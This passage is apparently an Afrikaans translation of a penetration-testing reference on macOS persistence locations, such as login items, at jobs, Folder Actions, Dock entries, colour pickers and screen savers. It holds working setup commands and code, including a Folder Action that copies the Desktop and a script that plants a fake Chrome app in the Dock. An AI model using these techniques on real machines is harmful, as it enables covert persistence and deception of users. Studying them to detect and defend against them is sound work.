Vir ’n gebundelde launch-plist, bepaal `BundleProgram` relatief tot die programbundel se wortel (byvoorbeeld `Contents/MacOS/Helper`), soos [Apple se migrasieriglyne vir Service Management](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos) spesifiseer. ’n Leesalleen-inventaris van `/Applications` op die navorsings-Mac het 14 gebundelde helper-inskrywings en vyf `BundleProgram`-verklarings gevind; al vyf teikens is opgelos, en twee het ’n kontrole vir skryfbaarheid deur die gebruiker geslaag. Dié kontrole bewys **nie** dat enige van die helpers geregistreer of geaktiveer is, uitvoerbaar is ná handtekeningvalidering, of deur ’n sandbox bereik kan word nie. `sfltool dumpbtm` het 150 benoemde rekords op hierdie Mac gelys; dit is ’n hulpmiddel vir inspeksie, nie ’n toets wat bevestig dat elke rekord loop nie.

Ouer aanmelditems kan ook deur Apple events bestuur word. Dit is moontlik om hulle vanaf die opdragreël te lys, by te voeg en te verwyder, hoewel die byvoeging daarvan die gebruiker se aanhoudende aanmeldopstelling verander en moontlik Automation-goedkeuring vereis:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` is ’n implementeringsdetail, nie ’n ondersteunde plek om ’n payload te installeer deur bloot ’n lêer daar te skryf nie. Die ouer `SMLoginItemSetEnabled`-API is vir nuwe helpers deur `SMAppService` vervang; die bladsy se vorige `/var/db/com.apple.xpc.launchd/loginitems.501.plist`-pad was afwesig op die macOS 26.5.2-to toetsmasjien. Gebruik die registrasie-API en die stelsel-UI-toestand wanneer jy moderne aanmelditems beoordeel, nie ’n veronderstelde databasispad nie.

### ZIP as Aanmelditem

(Kyk na die vorige afdeling oor Aanmelditems; dit is ’n uitbreiding)

As jy ’n **ZIP**-lêer as ’n **Aanmelditem** stoor, sal **`Archive Utility`** dit oopmaak. As die zip byvoorbeeld in **`~/Library`** gestoor is en die Folder **`LaunchAgents/file.plist`** met ’n backdoor bevat, sal daardie folder geskep word (dit bestaan nie by verstek nie) en die plist sal bygevoeg word. Wanneer die gebruiker dus die volgende keer weer aanmeld, **sal die backdoor wat in die plist aangedui word, uitgevoer word**.

Nog ’n opsie is om die lêers **`.bash_profile`** en **`.zshenv`** binne die gebruiker se HOME te skep, sodat hierdie tegniek steeds sal werk as die folder LaunchAgents reeds bestaan.

### At

Skrywe: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar jy moet **`at`** **uitvoer**, en dit moet **geaktiveer** wees
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Jy moet **`at`** **uitvoer**, en dit moet **geaktiveer** wees

#### **Beskrywing**

`at`-take is ontwerp om **eenmalige take te skeduleer** wat op bepaalde tye uitgevoer moet word. Anders as cron-take word `at`-take ná uitvoering outomaties verwyder. Dit is belangrik om daarop te let dat hierdie take ná stelselherbegin behoue bly, wat hulle onder sekere omstandighede ’n moontlike sekuriteitsrisiko maak.<sup>[[16]](#references)</sup>

Die gebundelde `com.apple.atrun.plist` het `Disabled = true`, maar launchd hou effektiewe geaktiveerde/gedeaktiveerde oorskrywings apart. Op die macOS 26.5.2-toetsmasjien het `launchctl print-disabled system` `com.apple.atrun` as **geaktiveer** aangedui, ondanks daardie gebundelde sleutel. Gaan die effektiewe toestand na voordat jy beweer dat `at`-take sal loop:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

’n Administrateur kan ’n gedeaktiveerde `atrun`-diens met `launchctl` aktiveer; die volgende historiese voorbeeld verander die toestand van ’n stelseldiens en is nie op die navorsings-Mac uitgevoer nie:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Dit sal oor 1 uur ’n lêer skep:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Gaan die taakwaglys na met `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Hierbo kan ons sien dat twee take geskeduleer is. Ons kan die besonderhede van die taak vertoon met `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> As AT-take nie geaktiveer is nie, sal die geskepte take nie uitgevoer word nie.

Die **taaklêers** kan gevind word by `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Die lêernaam bevat die tou, die taaknommer en die tyd waarop dit geskeduleer is om te loop. Kom ons kyk byvoorbeeld na `a0001a019bdcd2`.

- `a` - dit is die tou
- `0001a` - taaknommer in hex, `0x1a = 26`
- `019bdcd2` - tyd in hex. Dit verteenwoordig die minute wat sedert die epoch verloop het. `0x019bdcd2` is `26991826` in desimale formaat. As ons dit met 60 vermenigvuldig, kry ons `1619509560`, wat `GMT: 2021. April 27., Tuesday 7:46:00` is.

As ons die taaklêer druk, vind ons dat dit dieselfde inligting bevat as wat ons met `at -c` gekry het.

### Calendar-openlêerkennisgewings

- **Skryfdoelwit:** ’n Uitvoerbare toepassingbundel of ’n ander lêer wat **reeds gekies is** deur ’n Calendar-gebeurtenis se pasgemaakte **Open file**-kennisgewing. Om die kennisgewing self te skep of te wysig, vereis toegang tot daardie kalendergebeurtenis deur Calendar of ’n aanvaarde kalenderdatabron; ’n skryfaksie na ’n willekeurige lêer skep nie ’n kennisgewing nie.
- **Sneller:** Die geskeduleerde tyd van die kennisgewing op ’n Mac waarop Calendar die gebeurtenis verwerk. ’n Herhalende gebeurtenis kan die aksie herhaal. [Apple's current Calendar guide](https://support.apple.com/guide/calendar/icl1012/mac) bevestig die **Custom → Open file**-kennisgewingsopsie in macOS 26.
- **Uitvoeringsidentiteit en kontroles:** Calendar maak die gekose lêer oop vir die aangemelde gebruiker deur die toepassing wat daarmee geassosieer word. Die begin van ’n toepassingbundel kan die kode daarvan as daardie gebruiker uitvoer, onderhewig aan Gatekeeper, kwarantyn en ander macOS-kontroles. ’n Gewone skriflêer kan bloot in ’n redigeerder oopmaak; die lêeruitbreiding alleen bewys nie dat kode uitgevoer word nie.

Om ’n moontlike kandidaat veilig te beoordeel, inspekteer die gebeurtenis se kennisgewing in Calendar en die gekose lêer se toestemmings. Hierdie metode is op grond van Apple's guide gedokumenteer en **is nie** op die navorsings-Mac uitgevoer nie, omdat toetsing ’n lewendige kalender sou verander en op ’n lessenaargebeurtenis sou wag. In ’n weggooibare rekening kan ’n toets ’n merkeralleen-toepassingbundel kies, ’n **Open file**-kennisgewing vir ’n tyd in die nabye toekoms instel, die begin daarvan bevestig en daarna die gebeurtenis en toepassing uitvee.

### Shortcuts-outomatisering op macOS

- **Skryfdoelwit:** ’n Uitvoerbare lêer waarna reeds deur ’n shortcut se aksie verwys word, of ’n bestaande shortcut wat ’n gemagtigde gebruiker kan wysig. ’n Willekeurige `.shortcut`-lêer of ’n skryfaksie na ’n ongedokumenteerde Shortcuts-databasis is nie ’n ondersteunde manier om outomatisering te registreer nie.
- **Sneller en identiteit:** ’n Voorheen opgestelde, geaktiveerde outomatiseringsgebeurtenis, soos ’n tyd van die dag of ’n toepassingsgebeurtenis, roep die shortcut vir die aangemelde gebruiker aan. [Apple's current Mac automation guide](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) lys ondersteunde gebeurtenisse, verduidelik wanneer ’n outomatisering sonder toestemming kan loop en beskryf hoe om ’n sneller te verwyder. [Apple's Shortcuts privacy guide](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) vereis **Allow Running Scripts** vir skrifaksies, en individuele aksies kan steeds toestemmings versoek.

Dit is ’n voorwaardelike skryf-na-uitvoering-metode **slegs wanneer die bestaande aksie ’n skryfbare teiken laai**. Om ’n nuwe outomatisering deur die UI te skep, verander lewendige instellings en is nie op die navorsings-Mac probeer nie. In ’n weggooibare rekening kan ’n eienaar ’n tyd-van-die-dag-shortcut opstel waarvan die skrif `/tmp/ht-shortcuts-marker` aanraak, die nodige toestemmings aktiveer, die merker ná die gebeurtenis bevestig en dan die outomatisering, shortcut en merker uitvee.

### Automator-aksies en Quick Actions

- **Skryfdoelwitte:** `~/Library/Automator/*.action` (gebruiker) en `/Library/Automator/*.action` (administrateur) vir aksiebundels. ’n Gestoorde Quick Action-werkvloei word gewoonlik in `~/Library/Services/*.workflow` gehou; kontroleer die werklike werkvloeipad wat die gebruiker gekies het. [Apple's Automator framework reference](https://developer.apple.com/documentation/automator) lys die soekgidse vir aksies.
- **Sneller:** Automator laai beskikbare aksiebundels wanneer dit loop, maar ’n aksie se taak loop wanneer ’n werkvloei wat dit gebruik, uitgevoer word. ’n Quick Action loop wanneer die gebruiker dit in Finder, Services of ’n ander beskikbare kieslys kies. ’n Folder Action-werkvloei loop wanneer items by die vouer gevoeg word waaraan dit **reeds gekoppel is**, en ’n Calendar Alarm-werkvloei loop op die tyd van sy gebeurtenis. [Apple's workflow types](https://support.apple.com/guide/automator/aut7cac58839/mac) onderskei tussen hierdie gebeurtenisse. Om bloot ’n aksie of werkvloei te skryf, koppel nie ’n vouer daaraan of skeduleer ’n kalendergebeurtenis nie.
- **Uitvoeringsidentiteit en kontroles:** Die rekening wat die werkvloei uitvoer; Automator of die toepassing wat dit aanroep, moet die aksie laai en enige huidige kodeondertekening- of privaatheidskontroles moet dit toelaat. ’n Skryfbare aksiebundel waarna ’n aktiewe werkvloei reeds verwys, verskil van die installering van ’n nuwe aksie en wag vir iemand om dit te kies.

Die gebruiker se `Automator`- en `Services`-gidse was op die macOS 26.5.2-toets-Mac aanwesig; `/Library/Automator` was afwesig. Geen lewendige werkvloei is geskep, gekoppel of uitgevoer nie. Gebruik ’n weggooibare rekening en ’n merkeralleen-aksie/werkvloei om ’n bepaalde laaipad te bevestig. Die afsonderlike [Folder Actions](#folder-actions)-afdeling dek daardie gebeurtenisbron in meer besonderhede.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar jy moet `osascript` met argumente kan aanroep om met **`System Events`** kontak te maak sodat jy Folder Actions kan opstel
- TCC-omseiling: [🟠](https://emojipedia.org/large-orange-circle)
  - Dit het ’n paar basiese TCC-toestemmings, soos vir Desktop, Documents en Downloads

#### Ligging

- **`/Library/Scripts/Folder Action Scripts`**
  - Root-toegang vereis
  - **Sneller**: Toegang tot die gespesifiseerde vouer
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Sneller**: Toegang tot die gespesifiseerde vouer

#### Beskrywing en ontginning

Folder Actions is skrifte wat outomaties geaktiveer word deur veranderinge in ’n vouer, soos die byvoeging of verwydering van items, of ander aksies soos die oopmaak of verander van die grootte van die vouervenster. Hierdie aksies kan vir verskeie take gebruik word en op verskillende maniere geaktiveer word, soos deur die Finder-UI of terminaalopdragte.<sup>[[17]](#references)[[18]](#references)</sup>

Om Folder Actions op te stel, kan jy onder meer:

1. ’n Folder Action-werkvloei met [Automator](https://support.apple.com/guide/automator/welcome/mac) skep en dit as ’n diens installeer.
2. ’n Skrip handmatig koppel deur Folder Actions Setup in die kontekskieslys van ’n vouer te gebruik.
3. OSAScript gebruik om Apple Event-boodskappe na die `System Events.app` te stuur en ’n Folder Action programmaties op te stel.
   - Hierdie metode is veral nuttig om die aksie in die stelsel in te sluit en sodoende ’n mate van volharding te bied.

Die volgende skrip is ’n voorbeeld van wat deur ’n Folder Action uitgevoer kan word:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Om die bogenoemde script bruikbaar te maak deur Folder Actions, kompileer dit met:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Nadat die script saamgestel is, stel Folder Actions op deur die onderstaande script uit te voer. Hierdie script sal Folder Actions wêreldwyd aktiveer en die voorheen saamgestelde script spesifiek aan die Desktop-lêergids koppel.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Voer die opstellingskrip uit met:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Dit is hoe jy hierdie persistence via GUI implementeer:

Dit is die script wat uitgevoer sal word:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Kompileer dit met: `osacompile -l JavaScript -o folder.scpt source.js`

Skuif dit na:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Maak dan die `Folder Actions Setup`-app oop, kies die **vouer wat jy wil dophou** en kies in jou geval **`folder.scpt`** (in my geval het ek dit output2.scp genoem):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

As jy nou daardie vouer met **Finder** oopmaak, sal jou script uitgevoer word.

Hierdie konfigurasie is in base64-formaat gestoor in die **plist** by **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**.

Kom ons probeer nou om hierdie persistence sonder GUI-toegang voor te berei:

1. **Kopieer `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** na `/tmp` om dit te rugsteun:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Verwyder** die Folder Actions wat jy pas opgestel het:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Noudat ons ’n leë omgewing het:

3. Kopieer die rugsteunlêer: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Maak die Folder Actions Setup.app oop om hierdie konfigurasie te gebruik: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Dit het nie vir my gewerk nie, maar dit is die instruksies uit die writeup:(

### Dock-kortpaaie

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar jy moet ’n kwaadwillige toepassing binne die stelsel geïnstalleer hê
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `~/Library/Preferences/com.apple.dock.plist`
  - **Sneller**: Wanneer die gebruiker op die toepassing in die Dock klik

#### Beskrywing en uitbuiting

Al die toepassings wat in die Dock verskyn, word in die plist gespesifiseer: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Dit is moontlik om **’n toepassing by te voeg** met net:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Deur ’n bietjie **social engineering** te gebruik, kan jy byvoorbeeld Google Chrome in die Dock naboots en werklik jou eie script uitvoer:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Invoermetodes

- **Skryfdoel:** ’n Kodebevattende invoermetode-appbundel wat in `~/Library/Input Methods/` (gebruiker) of `/Library/Input Methods/` (administrateur) geïnstalleer is. Dit verskil van Apple se gewone teks `.inputplugin`-sleutelbordkarteringlêers, wat nie op hul eie ’n loonvrag met arbitrêre kode is nie.
- **Sneller:** Die gebruiker voeg die invoerbron by/aktiveer dit in **Stelselinstellings → Sleutelbord → Teksinvoer** en kies of gebruik dit dan. Om bloot ’n bundel na die gids te kopieer, bewys nie dat macOS dit sal laai nie. [Apple se huidige gids oor invoerbronne](https://support.apple.com/guide/mac-help/mchl84525d76/mac) beskryf hoe om bronne te aktiveer en tussen hulle te wissel; [Apple se InputMethodKit-dokumentasie](https://developer.apple.com/documentation/inputmethodkit) behandel invoermetodes wat kode bevat.
- **Uitvoeringsidentiteit en voorwaardes:** Die metode loop vir die aangemelde gebruiker, onderhewig aan invoermetoderegistrasie, kodesignering en die huidige macOS-sekuriteitskontroles. Bestaande geaktiveerde metodes met ’n skryfbare uitvoerbare lêer vereis ’n afsonderlike pad- en handtekeninghersiening.

Apple se [ouer nota oor derdeparty-invoermetodes](https://developer.apple.com/library/archive/qa/qa1810/_index.html) het reeds gewaarsku dat die kopiëring van sekere paletmetodes na hierdie gidse nie eens veroorsaak dat hulle in Invoerbronne verskyn nie. Op die macOS 26.5.2-navorsings-Mac bestaan die gebruikersgids, maar geen bundel is geïnstalleer of geaktiveer nie; dit is dus ’n gedokumenteerde voorwaardelike pad, nie ’n plaaslike looptydresultaat nie.

### Kleurkiesers

Beskrywing: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - ’n Baie spesifieke aksie moet plaasvind
  - Jy sal in ’n ander sandbox beland
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `/Library/ColorPickers`
  - Root word vereis
  - Sneller: Gebruik die kleurkieser
- `~/Library/ColorPickers`
  - Sneller: Gebruik die kleurkieser

#### Beskrywing en uitbuiting

**Kompileer ’n kleurkieser**-bundel met jou kode (jy kan byvoorbeeld [**hierdie een gebruik**](https://github.com/viktorstrate/color-picker-plus)), voeg ’n constructor by (soos in die [Skermbeskermer-afdeling](macos-auto-start-locations.md#screen-saver)) en kopieer die bundel na `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Wanneer die kleurkieser dan geaktiveer word, behoort jou bundel ook uit te voer.

Dit hang daarvan af dat ’n versoenbare toepassing die stelselkleurpaneel oopmaak en die geïnstalleerde kleurkieser kies. [Apple se gids oor kleurpanele](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) beskryf die verouderde bundelliggings. ’n Plaaslike padkontrole het die verouderde kleurkieser-XPC-diens gevind, maar geen kleurkieser was op die navorsings-Mac geïnstalleer of gelaai nie; moenie ’n TCC-omseiling bloot op grond van die pad aflei nie.

Let daarop dat die binêre lêer wat jou biblioteek laai ’n **baie beperkende sandbox** het: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync-inproppe

**Verslag**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Verslag**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Nuttig om sandbox te omseil: **Nee, want jy moet jou eie toepassing uitvoer**
- TCC-omseiling: Hang af van die geaktiveerde uitbreiding se sandbox en toestemmings; geen algemene omseiling is vasgestel nie.

#### Ligging

- ’n Spesifieke toepassing

#### Beskrywing & uitbuiting

’n Voorbeeld van ’n toepassing met ’n Finder Sync-uitbreiding [**kan hier gevind word**](https://github.com/D00MFist/InSync).

Toepassings kan `Finder Sync Extensions` hê. Hierdie uitbreiding word in ’n toepassing geplaas wat uitgevoer sal word. Daarbenewens moet die uitbreiding **onderteken wees** met ’n geldige Apple-ontwikkelaarsertifikaat om sy kode te kan uitvoer, moet dit **sandboxed** wees (hoewel verslapte uitsonderings bygevoeg kan word), en moet dit met iets soos die volgende geregistreer word:<sup>[[21]](#references)[[22]](#references)</sup>

’n Geïnstalleerde uitbreiding moet ook **geaktiveer** en vir ’n relevante Finder-ligging of -item aangeroep word; dit is nie genoeg om ’n willekeurige `.appex`-bundel te skryf nie. [Apple se Finder Sync API](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) stel die geaktiveerde status beskikbaar. Die `pluginkit`-opdragte hieronder illustreer eksplisiete registrasie en aktivering, nie outomatiese opstart deur bloot ’n lêer te plaas nie. Hierdie roete is deur dokumentasie nagegaan; geen nuwe uitbreiding is op die navorsings-Mac geïnstalleer of geaktiveer nie.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Skermbewaarder

Skrywe: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Skrywe: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy sal in ’n algemene toepassingsandbox beland
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `/System/Library/Screen Savers`
  - Root word vereis
  - **Sneller**: Kies die skermbewaarder
- `/Library/Screen Savers`
  - Root word vereis
  - **Sneller**: Kies die skermbewaarder
- `~/Library/Screen Savers`
  - **Sneller**: Kies die skermbewaarder

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Beskrywing & Uitbuiting

Skep ’n nuwe projek in Xcode en kies die sjabloon om ’n nuwe **skermbewaarder** te genereer. Voeg dan jou kode daarby, byvoorbeeld die volgende kode om logs te genereer.<sup>[[23]](#references)[[24]](#references)</sup>

**Bou** dit en kopieer die `.saver`-bundel na **`~/Library/Screen Savers`**. Maak dan die skermbewaarder-GUI oop en klik daarop; dit behoort baie logs te genereer:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Let daarop dat jy, omdat jy **`com.apple.security.app-sandbox`** in die entitlements van die binary wat hierdie kode laai (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) kan vind, **binne die common application sandbox** sal wees.

Saver-kode:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight-inproppe

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy sal in ’n toepassing-sandbox beland
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)
  - Die sandbox lyk baie beperk

#### Ligging

- `~/Library/Spotlight/`
  - **Sneller**: ’n Nuwe lêer met ’n uitbreiding wat deur die Spotlight-inprop bestuur word, word geskep.
- `/Library/Spotlight/`
  - **Sneller**: ’n Nuwe lêer met ’n uitbreiding wat deur die Spotlight-inprop bestuur word, word geskep.
  - Root word vereis
- `/System/Library/Spotlight/`
  - **Sneller**: ’n Nuwe lêer met ’n uitbreiding wat deur die Spotlight-inprop bestuur word, word geskep.
  - Root word vereis
- `Some.app/Contents/Library/Spotlight/`
  - **Sneller**: ’n Nuwe lêer met ’n uitbreiding wat deur die Spotlight-inprop bestuur word, word geskep.
  - ’n Nuwe toepassing word vereis

#### Beskrywing en uitbuiting

Spotlight is macOS se ingeboude soekfunksie, ontwerp om gebruikers **vinnige en omvattende toegang tot data op hul rekenaars** te bied.\
Om hierdie vinnige soekvermoë moontlik te maak, hou Spotlight ’n **eiendomsregtelike databasis** by en skep ’n indeks deur **die meeste lêers te ontleed**, wat vinnige soektogte deur lêername en hul inhoud moontlik maak.<sup>[[25]](#references)</sup>

